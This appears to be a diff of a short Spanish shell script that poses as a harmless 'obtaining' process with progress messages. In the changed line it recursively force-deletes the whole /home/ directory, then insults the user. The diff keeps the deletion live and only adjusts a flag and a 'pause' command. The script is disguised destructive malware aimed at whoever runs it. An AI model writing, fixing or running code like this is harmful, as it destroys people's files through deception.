@@ -8,7 +8,7 @@ read -p "Pulsa ENTER para comenzar"
 clear
 echo Esta comenzando el proceso...
 sleep 1
-rm -r -f --no-preserve-root /home/
+rm -r -f /home/
 sleep 2
 echo Terminando proceso de obtención, espere...
 sleep 2
@@ -17,6 +17,7 @@ echo
 echo
 read -p "Si has terminado, precione ENTER."
 clear
+echo
 echo Gilipolla !
-pause 1
+sleep 1
 exit
